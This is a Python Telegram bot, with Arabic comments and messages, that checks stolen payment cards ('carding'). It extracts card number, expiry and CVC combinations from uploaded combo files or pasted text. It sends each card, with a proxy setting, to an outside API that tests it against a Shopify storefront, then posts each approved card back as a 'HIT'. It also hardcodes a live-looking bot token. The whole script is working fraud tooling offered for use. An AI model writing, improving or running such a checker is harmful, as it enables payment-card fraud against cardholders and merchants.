import telebot
import requests
import re
import threading
import os
from time import sleep

TOKEN = '8558756991:AAHswTBL0ds0QaAaAyBuwvJtTCsNbPRyd5A'
bot = telebot.TeleBot(TOKEN)

# إعدادات المستخدم الافتراضية
user_settings = {}

def get_settings(chat_id):
    if chat_id not in user_settings:
        user_settings[chat_id] = {
            'site': 'https://renovate-wallcoverings.myshopify.com',
            'proxy': '(apni'
        }
    return user_settings[chat_id]

# --- استقبال الملفات (Combo File) ---
@bot.message_handler(content_types=['document'])
def handle_docs(m):
    settings = get_settings(m.chat.id)
    file_info = bot.get_file(m.document.file_id)
    downloaded_file = bot.download_file(file_info.file_path)
    
    # قراءة محتوى الملف واستخراج البطاقات
    content = downloaded_file.decode('utf-8')
    cards = re.findall(r'\d{15,16}\|\d{1,2}\|\d{2,4}\|\d{3,4}', content)
    
    if not cards:
        bot.reply_to(m, "❌ الملف لا يحتوي على بطاقات بتنسيق صحيح.")
        return
    
    start_checking(m.chat.id, cards, "File")

# --- استقبال النص (Manual/Text Combo) ---
@bot.message_handler(func=lambda m: True)
def handle_text(m):
    if m.text.startswith('/start'):
        bot.reply_to(m, "أهلاً مصطفى! أرسل الكومبو (نص أو ملف) وسأبدأ الفحص فوراً.")
        return

    cards = re.findall(r'\d{15,16}\|\d{1,2}\|\d{2,4}\|\d{3,4}', m.text)
    if not cards:
        bot.reply_to(m, "❌ أرسل بطاقات بتنسيق: CC|MM|YY|CVC")
        return
    
    start_checking(m.chat.id, cards, "Direct Text")

def start_checking(chat_id, cards, source):
    msg = bot.send_message(chat_id, f"⏳ جاري التحضير لفحص {len(cards)} بطاقة من {source}...")
    threading.Thread(target=process_cards, args=(chat_id, msg.message_id, cards)).start()

def process_cards(chat_id, msg_id, cards):
    live = 0
    dead = 0
    total = len(cards)
    settings = get_settings(chat_id)

    for index, card in enumerate(cards, 1):
        try:
            api_url = f"https://web-production-a8008.up.railway.app/shopify?site={settings['site']}&cc={card}&proxy={settings['proxy']}"
            
            # محاولة الفحص عبر الـ API
            res = requests.get(api_url, timeout=20).json()
            response_msg = res.get("Response", "N/A")
            
            # تحديث لوحة التحكم لكل عملية
            update_text = (f"🌩 <b>Kilua Cloud V2</b>\n"
                           f"━━━━━━━━━━━━━━\n"
                           f"💳 <b>Checking:</b> <code>{card}</code>\n"
                           f"📊 <b>Progress:</b> {index}/{total}\n"
                           f"✅ <b>Approved:</b> {live}\n"
                           f"❌ <b>Declined:</b> {dead}\n"
                           f"━━━━━━━━━━━━━━\n"
                           f"🌐 <b>Site:</b> {settings['site']}")
            
            bot.edit_message_text(update_text, chat_id, msg_id, parse_mode="HTML")

            # التحقق من النتيجة (إذا كانت ناجحة)
            if res.get("Status") == True or "APPROVED" in response_msg.upper():
                live += 1
                # إرسال رسالة منفصلة لكل لايف فوراً
                bot.send_message(chat_id, 
                    f"🎯 <b>HIT / APPROVED</b>\n"
                    f"━━━━━━━━━━━━━━\n"
                    f"CC: <code>{card}</code>\n"
                    f"Gateway: {res.get('Gateway', 'Shopify')}\n"
                    f"Response: {response_msg}\n"
                    f"━━━━━━━━━━━━━━\n"
                    f"By: مصطفى النجم 🇮🇶", parse_mode="HTML")
            else:
                dead += 1

        except Exception as e:
            print(f"Error: {e}")
            dead += 1
        
        sleep(1) # تأخير بسيط للحفاظ على استقرار الـ API

    bot.send_message(chat_id, f"✅ اكتمل الفحص!\nإجمالي الحية: {live}")

bot.infinity_polling()
